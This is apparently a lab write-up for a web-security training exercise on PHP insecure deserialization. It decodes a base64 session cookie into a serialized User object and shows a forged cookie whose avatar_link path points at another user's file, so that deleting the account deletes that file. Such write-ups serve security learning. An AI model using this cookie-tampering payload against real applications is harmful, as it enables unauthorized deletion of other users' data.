@@ -1,0 +1,26 @@
+This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. 
+To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+
+the following cookie:
+Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjbHQ3Y3ptb2F0OHNkdjV3YWE5dnZ2OW16aGIyM25vYiI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
+
+decodes to give:
+O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"clt7czmoat8sdv5waa9vvv9mzhb23nob";s:11:"avatar_link";s:19:"users/wiener/avatar";}
+
+When the user deletes their account the avatar profile image directory is deleted too.
+
+so if we the user can have access to changing this path we can delete any file we like by changing the path and deleting our account.
+
+
+therefore changing the cookie to:
+session = Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImcwbnFhMGVud2c5N2t2M2MzaTV4Zjd6MmZtYjcxaWRhIjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=
+
+which decodes as:
+O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"g0nqa0enwg97kv3c3i5xf7z2fmb71ida";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+
+
+and deleting my account, deletes the file morale.txt on carlos' account.
